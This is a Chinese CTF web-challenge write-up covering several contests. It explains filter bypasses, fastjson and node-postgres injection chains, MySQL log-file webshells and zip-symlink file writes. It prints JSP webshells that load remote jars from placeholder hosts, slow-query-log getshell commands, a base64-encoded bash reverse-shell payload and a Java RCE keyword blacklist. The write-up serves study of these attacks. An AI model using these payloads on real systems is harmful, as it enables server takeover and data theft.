<h4 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h4><p>另：因为他用了highlight_file，所以可以任意文件读，然后我看了一眼<code>do think show</code>的功能，do要先等于think，然后think再过一个超级过滤，长度还不能大于10，之后进eval。这有屁用啊，这个源码你拿出来我都不会用think去命令执行好吗，并且没源码就嗯猜这个功能吗。show就是限制长度和一定过滤的文件包含</p>
<h3 id="hbs"><a href="#hbs" class="headerlink" title="hbs"></a>hbs</h3><p>题目名是啥忘了，反正是打hbs模板注入<br>先给了一部分源码，先是一个SQL注入登进去，黑名单过滤了一堆东西，但是是用nodejs写的，黑名单过滤用的include判断，额，好像不区分大小写，大小写直接过，然后注入要求又是输入的password要等于结果的password，用我之前在第五空间提到的经典套娃payload过<br>登进去之后一个后台，可以改头像和改签名，研究了半天，发现在改头像那有任意文件读，可以把头像图片改成其他文件，不过他对请求的时间戳有限制，所以写个脚本拿，可以拿到后台部分的源码，是一个hbs模板注入，还提供了一个原型链污染的点<br>（做到这的时候，我感觉这个题就是前面东华杯的强化版。。。）<br>原型链污染过滤了<code>__proto__</code>，但是不是不允许包含这个字符串，而是不能单独出现这个字符串。。。那不就又是垃圾代码，用肯定是<code>__proto__.xxx</code>这样子去赋值的啊</p>
<p>可以渲染hbs模板，但是只能渲染他的模板，并且渲染参数也被控制了，似乎一个原型链污染也不会有太大的攻击面，又不能写文件渲染自己的模板，不会了</p>
<h2 id="L3H"><a href="#L3H" class="headerlink" title="L3H"></a>L3H</h2><p>高强度坐牢，web爷爷出了两个简单一点的题，剩下三个题两个java一个要点逆向，直接躺平</p>
<h3 id="image-service1"><a href="#image-service1" class="headerlink" title="image service1"></a>image service1</h3><p>简单题1，主要是看附件里的init.sql可以看出来</p>
<pre class=" language-MYSQL"><code class="language-MYSQL">-- MySQL dump 10.13  Distrib 8.0.27, for Linux (x86_64)
--
-- Host: localhost    Database: ctf
-- ------------------------------------------------------
-- Server version       8.0.27

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `ctf`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `ctf` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;

USE `ctf`;

--
-- Table structure for table `images`
--

DROP TABLE IF EXISTS `images`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `images` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint unsigned DEFAULT NULL,
  `image_id` longtext,
  PRIMARY KEY (`id`),
  KEY `fk_users_images` (`user_id`),
  CONSTRAINT `fk_users_images` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `images`
--

LOCK TABLES `images` WRITE;
/*!40000 ALTER TABLE `images` DISABLE KEYS */;
/*!40000 ALTER TABLE `images` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shares`
--

DROP TABLE IF EXISTS `shares`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `shares` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint unsigned DEFAULT NULL,
  `link` longtext,
  PRIMARY KEY (`id`),
  KEY `fk_users_shares` (`user_id`),
  CONSTRAINT `fk_users_shares` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `shares`
--

LOCK TABLES `shares` WRITE;
/*!40000 ALTER TABLE `shares` DISABLE KEYS */;
/*!40000 ALTER TABLE `shares` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(191) DEFAULT NULL,
  `password` longtext,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_username` (`username`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-11-09  8:43:51
</code></pre>
<p>这个SQL文件模板感觉也非常的靠谱，抄一下，也许以后能用少，内联注释的各种操作保证数据库的各种兼容性，字符集还是用的utf8mb4，究极安全，防御各种宽字节以及特殊编码打击</p>
<p>一共三个表，images，shares，users，用户那里设置了username是unique的，所以也没法用SQL约束攻击也打不通。images存了用户上传的图片信息，而shares存的是用户选择公开的图片的信息</p>
<p>images和shares都使用user_id来标识文件的所有权。服务一共就三个功能，上传，分享，搜索他人的分享</p>
<p>搜索他人的分析是输用户名的，但admin不被允许，所以没法之前看admin的分析内容<br>但是ADMIN就可以了。。。因为过滤应该是只过滤了全小写的admin字符，而查询的方式应该是通过username查userID，再通过userID查分享内容，这样子mysql默认不区分大小写，用大小写就能绕过获取到flag</p>
<h3 id="image-service2"><a href="#image-service2" class="headerlink" title="image service2"></a>image service2</h3><p>嗯，分析了半天发现完全没法打，估计要逆向，然后re爷爷不会看go，也没有动调，我也不会动调（这两天就学gdb），不会</p>
<p>图片分享时需要一个token进行核验，token目测是根据图片的uuid以及渲染的一系列参数确定的，admin分享了两个flag，第一个flag因为没有任何渲染，可以直接看见，而第二个不仅只截取了部分，还加了模糊和额外的文本，无法识别。</p>
<p>虽然我们可以用自己的图片提交参数得到对应的渲染结果，但是我们并不知道后端是怎么进行token的计算的，尝试直接用自己的账号去渲染flag图片的uuid，显示没有这个图，所以渲染时是会对图片所有权进行检测的，那没办法了</p>
<p>看wp发现原来大家的web选手都是会逆向的啊。直接gdb下断点就拿到了token的构造方式，然后构造属性字段，使得自己图片构造出的token和admin分享的图片的token值一致即可</p>
<p>如果能拿到token构造后面这步也并不难，可惜了。不甘心ing</p>
<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>gdb学成归来，直接让pwn爷爷手把手带一下，很简单嘛，我已经完全掌握了.jpg<br>先装一个无敌的pwndbg插件，调试的时候直接显示堆栈寄存器，吴迪</p>
<p>然后把那个提供图片服务的main丢进ida，不要管怎么用，旁边有显示函数名字（是go本身保留了这些调试信息吗？还是出题人的好心？）<br>直接找到两个看起来比较像样的函数<br><code>gitlab_l3hsec_com_l3hctf_image_service_token_Sign</code>以及<code>gitlab_l3hsec_com_l3hctf_image_service_token_Check</code><br>f5反汇编，tab切到text显示，直接看地址（pwn爷爷和我说这个是没开无敌的地址随机化的，所以这里的地址有6位十六进制数，开了的话应该只有最后12bit（还是16？）是固定的，那个时候ida就只显示3&#x2F;4个十六进制数，这个时候就要先start把程序load进来，然后看内存映射情况，在加上偏移后为函数实际地址</p>
<p><code>b *addr</code>（十六进制地址）打断点，<code>n</code>step over，<code>s</code>step into，然后直接在sign和check处打断点，<code>gdb main</code>启动，直接访问一下服务，<code>c</code>运行到断点处（大概），就一直step over，因为pwndbg这个插件能自动显示断点处的各种变量堆栈之类的情况，就边单步边看，能在sign中看到拼接出来的结果<br>大概为<code>map[key:[value]]</code>这个样子（就是参考链接中wp的那个样子），得到这个结果基本上就能开始构造了</p>
<p>说起来好像不是很难呜呜</p>
<h3 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h3><p>上来就highlight file，并且代码还非常简单，只要get两个参数和预期的值一样就行了，但是直接提交的话，完全行不通，稍微点击一下就能发现似乎有些字符隔空进行了连接，这也是注释里出现了不同颜色的字符的原因。直接开console看的话看到的是<code>&amp;#202e;</code>这么个字符<br>搜一下，发现这个字符的意思似乎是该行从右至左展示，甚至搜出来的条目的title因为包含了这个字符都变成反的了。。。。比如这个，最骚的是，这种特殊字符能被复制下来，而不像其他的字符会变成空格<br><code>‮- 从右至左强制: U+202E - Unicode 字符百科‬</code></p>
<p>思考了半天其中的逻辑，最后发现直接python requests拉下来然后整体url编码硬看原始数据就行了<br>这个还赋予了一个CVE号，表明可以使用这些字符误导开发者，在注释中藏匿有害代码，（但事实上复制到txt里面的时候会显示出这个特殊字符，而复制到jetbrain全家桶时，会显示该文本含有类似字符的提示）<br>大致原理就是反复套强制从左至右和从右至左，就能把代码以不符合其原始语义的形式进行展示<br>似乎有一个类似官网的网站<br><a href="https://trojansource.codes/">Trojan Source</a></p>
<h3 id="cover"><a href="#cover" class="headerlink" title="cover"></a>cover</h3><p>是一个古老的框架，可以直接下源码下来，翻源码可以看到默认管理员账户密码，直接登进去，然后不会了，看完wp说是fastjson 1.2.68的全新玩法，虽然赛时就给了hint，不过那个时候已经躺平了，到时候另作学习</p>
<p><strong>并不是什么古老的框架，题目用的前端框架叫adminex，而我刚好在GitHub上搜到了一个叫adminex的后端框架，还刚好是用java写的。。。然后我就看了那个玩意半天，并且hint给出了fastjson，我还找了半天怎么找不到哪里调用了fastjson。无语了</strong></p>
<p>题解就是1.2.68的一个盲注读文件的payload，在今年的blackhat USA上有披露，直接抄来就能打<br>这里还是有一些trick，虽然我还不怎么熟练，但稍微记录一下<br>题目代码是这样子的<code>JSON.parseArray(data,User.class);</code>(hint中给出，我那个时候就在想我下下来的adminex怎么没这回事)。。。</p>
<p>首先是parseArray，所以传过去的数据得是个数组，这个很简单，套一层数组就行了，然后这里指定了反序列化的类，得是User类，所以不能直接打我们的payload，绕过方法似乎很多，比如给User类随便加一个属性，这个属性的值就是我们的payload值（也许要先在值外面套一层JSONObject？），或者看nepnep的wp中写的，把user的age属性指定成一个JSONObject，然后再在里面把payload套进去（感觉是一样的），用<code>$ref</code>这个关键字表示这个值引用另一个值，可以用来触发属性的get方法</p>
<p>关于<code>$ref</code>如何触发get方法<br><a href="https://blog.csdn.net/solitudi/article/details/120275526">Fastjson＞&#x3D;1.2.36$ref引用可触发get方法分析</a></p>
<p>payload就是这里面的<br><a href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg">关于blackhat2021披露的fastjson1.2.68链</a></p>
<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>传jsp马的超级过滤题，先是把jsp替换到空，这个过滤约等于没有过滤，然后来了个<code>[a-zA-Z0-9]&#123;2,&#125;</code>的究极过滤，直接不会，搜无字母数字shell之类的东西永远是PHP的那几个和P神的文章，不会了</p>
<p>看wp是用的UTF-16编码。虽然不知道能有这个操作，但确实a-zA-z0-9只允许连续出现一次这个操作，非常的契合UTF-16编码。害，没想到。因为当初UTF-16这里都没过，所以他还有一个没有开源的黑名单过滤，不知道过滤了些啥，也搞不出来了。并且现在环境也关了。。。</p>
<p>这边看杭电的wp是用的<code>ScriptEngineFactory</code>这个类之间过了。jsp的shell也没收集过啥。。不知道有哪些能用，抄一下吧</p>
<pre class=" language-jsp"><code class="language-jsp"><%@ page language="java" pageEncoding="UTF-16BE" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="java.util.ServiceLoader" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%
   Class clazz = Class.forName("javax.script.ScriptEng"+"ineFactory");
   Iterator serviceLoader = ServiceLoader.load(clazz, new URLClassLoader(new URL[]{new URL("http://ip:port/evil.jar")})).iterator();
   while (serviceLoader.hasNext()){
      serviceLoader.next();
   }
%>
</code></pre>
<p>顺便还附了一个jsp马的GitHub项目链接<br><a href="https://github.com/threedr3am/JSP-Webshells">https://github.com/threedr3am/JSP-Webshells</a></p>
<h4 id="update-1"><a href="#update-1" class="headerlink" title="update"></a>update</h4><p>看了官方wp，这里的UTF-16编码绕过，实际上是利用了处理时使用的类和tomcat解析时的编码不一致导致的绕过</p>
<blockquote>
<p>FileItem.getString()对于编码的解析跟Tomcat解析jsp是有差异的，默认为<br>ISO-8859-1<br>而Tomcat对于jsp编码的解析主要在org.apache.jasper.compiler.EncodingDetector这个类，其中有很<br>多默认用ISO-8859-1无法直接解析的编码。</p>
</blockquote>
<p>作者提到，在tomcat支持的编码中，有许多是ISO-8859-1不能直接解析的，除了大家都爱的UTF-16外，还有UCS-4和CP037等编码<br>而如果waf进行了超级内容过滤，只要他不支持这种编码的解析，就能随意绕过</p>
<p>也看到了过滤的黑名单，也可以从这个黑名单中去学习RCE的思路</p>
<pre class=" language-java"><code class="language-java">String<span class="token punctuation">[</span><span class="token punctuation">]</span> blackWordsList <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//危险关键字</span>
    <span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token string">"Runtime"</span><span class="token punctuation">,</span> <span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token string">"ProcessBuilder"</span><span class="token punctuation">,</span>
    <span class="token string">"loadClass"</span><span class="token punctuation">,</span> <span class="token string">"ScriptEngine"</span><span class="token punctuation">,</span>
    <span class="token string">"setAccessible"</span><span class="token punctuation">,</span> <span class="token string">"JdbcRowSetImpl"</span><span class="token punctuation">,</span> <span class="token string">"ELProcessor"</span><span class="token punctuation">,</span>
    <span class="token string">"ELManager"</span><span class="token punctuation">,</span> <span class="token string">"TemplatesImpl"</span><span class="token punctuation">,</span> <span class="token string">"lookup"</span><span class="token punctuation">,</span>
    <span class="token string">"readObject"</span><span class="token punctuation">,</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true">//写⽂件</span>
    <span class="token string">"File"</span><span class="token punctuation">,</span> <span class="token string">"Writer"</span><span class="token punctuation">,</span> <span class="token string">"Stream"</span><span class="token punctuation">,</span> <span class="token string">"commons"</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true">//request</span>
    <span class="token string">"request"</span><span class="token punctuation">,</span> <span class="token string">"Request"</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true">//特殊编码也处理⼀下</span>
    <span class="token string">"\\u"</span><span class="token punctuation">,</span> <span class="token string">"CDATA"</span><span class="token punctuation">,</span> <span class="token string">"&amp;#"</span>
    <span class="token comment" spellcheck="true">//这下总安全了吧</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>invoke,setAccessible这些都是经典反射操作，JdbcRowSetImpl和lookup则是jndi注入操作（出题人说为了降低难度选择了较低版本的jdk，所以还能用jndi注入打），Runtime和ProcessBuilder经典直接命令执行，而defineClass，TemplateImpl，newInstance都是从字节码中还原类，实例化之类的。顺便禁用了文件读写防止写入文件二次绕过（这里把\u给ban了感觉写入文件也没用？）还有一些ScriptEngine，ELProcessor，ELManager就是我没见过的知识了</p>
<p>还有用URLClassloader直接加载远程类rce的，对不起我真的是java废物<br>Class.forName方法第二个参数指定是否初始化类，直接初始化就能触发恶意类在static中的代码段，从而实现RCE</p>
<pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.URL"</span> <span class="token operator">%</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.URLClassLoader"</span> <span class="token operator">%</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span>
    URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://ip/rce.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    URLClassLoader ucl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>url<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.test.rce"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">,</span>ucl<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token operator">></span>
</code></pre>
<p>抄的这边，tqltql<br><a href="https://y4tacker.blog.csdn.net/article/details/121363886">[2021XCTF]L3HCTF-Writeup(Web)</a></p>
<p>出题人为了简单起见出了网，但同时也提到了不出网情况下的利用方案，利用bcel ClassLoader绕过，这个操作看起来感觉和那种用bytecode来defineClass并实例化有点像</p>
<blockquote>
<p>bcel字节码webshell的原理在于com.sun.org.apache.bcel.internal.util.ClassLoader在loadClass的时<br>候会解析并加载bcel字节码</p>
</blockquote>
<p>虽然ban了loadClass，但forName实际上是会去调用loadClass，之前学那个tomcat的buggyloader的时候就学过这一点</p>
<p>这个bcel操作暂时没学，先码着payload，也是这个师傅的各种jsp马中的一个，tqltql，再膜一下<br><a href="https://github.com/threedr3am/JSP-Webshells/blob/master/jsp/1/BcelEvil.java">threedr3am&#x2F;JSP-Webshells</a></p>
<p>也许改天可以把这个库过一下来学习各种java RCE方式？</p>
<h2 id="深育"><a href="#深育" class="headerlink" title="深育"></a>深育</h2><p>这个比赛就当初完全没看见，就没报名，结束了之后看了看wp，发现好像题出的还挺好的，有好几个没见过的知识点，所以也就就着wp复现一下</p>
<h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>在secure-file-priv配置不能写文件的情况下，利用日志文件getshell的操作，当然，还是要有对应文件写权限的<br>虽然看wp后面有很奇怪的操作，找用户然后在用户home目录翻到了ssh.log，flag在那个里面。。。但总归前面半边的操作还是比较合理的。开个mysql试验一下</p>
<p>MySQL的日志分为错误日志，通用日志，更新日志（已弃用），二进制日志，慢查询日志和InnoDB日志。<br>常用的应该是通用日志和慢查询日志getshell，但通用日志记录所有的访问内容，很容易因为过大导致服务器500，所以慢查询日志比较常用<br>看起来能用的错误日志，只能在mysql启动的时候通过配置文件或者命令行参数指定，如果尝试在启动后进行修改，会报一个只读的错我<br><code>ERROR 1238 (HY000): Variable &#39;log_error&#39; is a read only variable</code></p>
<p>使用如下命令进行慢查询日志的配置（攻击时需要能够堆叠注入）</p>
<pre class=" language-mysql"><code class="language-mysql">show variables like '%slow_query_log%'
set global slow_query_log=1;
set global slow_query_log_file='/var/www/html/shell.php';
</code></pre>
<p>慢日志只记录查询时间超过<code>long_query_time</code>的语句，可以直接sleep之类的来使其超时，比如<code>select &#39;&lt;?php phpinfo();?&gt;&#39;,sleep(10);</code>，限制条件下也可以用一些耗时计算语句来消磨时间<br>当然，这样效率较为低下，可以直接设置<code>long_query_time</code>这个变量为0.000001，mysql允许的最小时间进度？这样子所有的查询就都会被记录了。<br>对于通用日志，所需设置的变量为<code>general_log general_log_file</code></p>
<h3 id="FakeWget"><a href="#FakeWget" class="headerlink" title="FakeWget"></a>FakeWget</h3><p>感觉不算太难的一个题，wget的命令注入，通过fuzz的方法找过滤情况，然后用wget的http_proxy和body-file参数外带文件。<br>最后又是读passwd找用户。。。找到用户后读.bash_history找到程序根目录，读取flag</p>
<h3 id="EasyWAF"><a href="#EasyWAF" class="headerlink" title="EasyWAF"></a>EasyWAF</h3><p>这个题要我做估计是做不出来了。。。<br>所有的hint靠cookie给出，这个就有一点脑洞。。。<br>有关waf的提示是max_allowed_packet，而SQL注入的提示是node-postgres<br>所以是用max_allowed_packet过waf，再用node配合postgresql的洞rce(我还真没听说过这个洞)<br>先看max_allowed_packet，这个是MySQL设置的服务端接受的最大的数据包的大小，看了下默认值为67108864，感觉应该是在64M左右，只要发过去的查询语句大于64M，MySQL就会拒绝这个包，也就能绕过waf了？暂时没有很理解把查询语句放到数据库里比对的waf是怎么工作的</p>
<p>node+postgresql的洞有点远古，不过搜一下倒是很容易搜到，这里就有一篇p神的文章(17年的。。。)<br><a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">node.js + postgres 从注入到Getshell</a><br>漏洞的大体成因为node将查询的返回值中的字段名拼了起来，并将结果传入了Function类构造函数的第三个参数，也就是函数体，而防止字段逃逸的措施只是将<code>&#39;</code>变为<code>\&#39;</code>，这样子的话只要我们本身传入一个<code>\&#39;</code>，那么得到的结果就是<code>\\&#39;</code>，直接逃逸进行命令执行</p>
<p>不过对于<code>SELECT username,password from users where id=</code>这种注入语句，字段名语句被固定为了username和password，是无法更改的，所以要使用堆叠注入，直接新加一条语句来创建我们自己的字段</p>
<p>至于实战利用，没开环境试了，直接抄p神的结论</p>
<blockquote>
<p>单双引号都不能正常使用，我们可以使用es6中的反引号<br>Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。<br>一个fieldName只能有64位长度，所以我们通过多个fieldName拼接来完成利用</p>
</blockquote>
<pre><code>SELECT 1 AS &quot;\&#39;]=0;require=process.mainModule.constructor._load;/*&quot;, 2 AS &quot;*/p=require(`child_process`);/*&quot;, 3 AS &quot;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&quot;, 4 AS &quot;*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//&quot;
</code></pre>
<p>这个payload挺巧妙的，把多个字段拼接起来，并且每个字段之间还要内联注释闭合，这样子字段间就算分开，也不怕中间出现奇怪的数据干扰</p>
<h3 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h3><p>首先是一个任意文件下载，通过下载给的日志路径下当天的日志，获取jar包名称，下载jar包反编译，看pom是一个有common-beanutils但无CC的环境<br>我直接联想p神的另一篇文章<br><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">CommonsBeanutils与无commons-collections的Shiro反序列化利用</a><br>利用Commons Beanutils中的BeanComparator，直接触发templateImpl的getOutputProperties</p>
<p>wp中将templateImpl的bytecode换成了tomcat回显的版本，不知道能不能直接弹shell出来，还是说经典不通外网？</p>
<h3 id="ZIPZIP"><a href="#ZIPZIP" class="headerlink" title="ZIPZIP"></a>ZIPZIP</h3><p>这个题感觉很有意思，和之前HCTF那个经典zip解压软链接有的一拼，不过那个题是软链接任意文件读，这个是软链接任意文件写。思路倒是很简单，但是说实话不一定想得出来</p>
<p>功能也就是解压压缩包，操作就是先传一个压缩包，里面塞一个软链接，比如叫test，软链接指向&#x2F;var&#x2F;www&#x2F;html&#x2F;这个目录，第二次再传一个压缩包，压缩包内容是test目录，目录下塞一个shell.php，这样子在解压的时候就会把shell通过之前传的test软链接写到&#x2F;var&#x2F;www&#x2F;html目录下<br>（就这么打字说着感觉好不带劲哦）</p>
<h2 id="湖湘"><a href="#湖湘" class="headerlink" title="湖湘"></a>湖湘</h2><p>湖湘杯，好像三个web就做出来一个最简单的<br>java那个题，给了pom.xml，但是进去之后我连接口有哪些都不知道，虽然看pom应该是先经典shiro越权进去，但是，越哪个路由的权呢？<br>还有一个究极xss，出题人一开始把源码藏着，最后个把小时放出来了，看了一下发现admin的处理逻辑都和普通用户不一样，不过就算有源码也做不出来，感觉是要注册一个service worker去打，到时候有空再研究一下</p>
<h3 id="willphp"><a href="#willphp" class="headerlink" title="willphp"></a>willphp</h3><p>一个上古上古上古框架，说是套着tp改的，实际上感觉没什么相同点，就是也是MVC框架罢了。给了个indexController的源码，但是页面上有写版本，直接下一份源码下来看<br>index代码没写啥，就调用了一个assign，然后调用了view<br>直接找他源码里调用的assign和view函数，assign就是把view类的<code>$_vars</code>数组进行键值对的赋值，而views最后会调用到renderTo函数，长这样</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">renderTo</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">,</span> <span class="token variable">$_vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token constant">__MODULE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-'</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">.</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'jump.html'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-jump.html.php'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token constant">PATH_VIEWC</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$cfile</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$strs</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">comp</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$_vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">,</span> <span class="token variable">$strs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token variable">$cfile</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>vars就是我们之前可控的那个变量，然后这里<code>extract($_vars);include $cfile;</code>，一个超级明显的变量覆盖+文件包含</p>
<p>用经典upload progress打通，不过这里环境怪怪的，本来比较稳妥的做法是upload progress写文件，再稳定包含写的文件，但不知道为什么就是写不进去，我还以为不能打，最后直接执行命令反而成功了</p>
<h2 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h2><p>高强度坐牢。改天也得联系一下CMS的审计，这把有一个人写的rainrock还是什么框架，实属给我看懵了，全程拼音加缩写命名，并且感觉代码结构和常见的tp也有点出入。。。呜呜呜</p>
<h3 id="灏妹的web"><a href="#灏妹的web" class="headerlink" title="灏妹的web"></a>灏妹的web</h3><p>就是敏感信息泄露吧，整了个index.php路由，还返回一个x-powered-by的PHP头<br>扫目录，但是扫啥都200，但是又没内容，然后用眼睛硬看，看见一个<code>.idea/workspace.xml</code>，是用jetbrain家的东西写的，翻了翻idea其他相关内容，jre都出现了，java写的。。。然后搜GitHub发现了一个idea目录的利用脚本，说是能扫敏感信息，扫了一下屁用没有。然后另一个师傅可能看的比较仔细，或者dirsearch比较高级，扫出来了一个dataSource.xml，flag直接在里面</p>
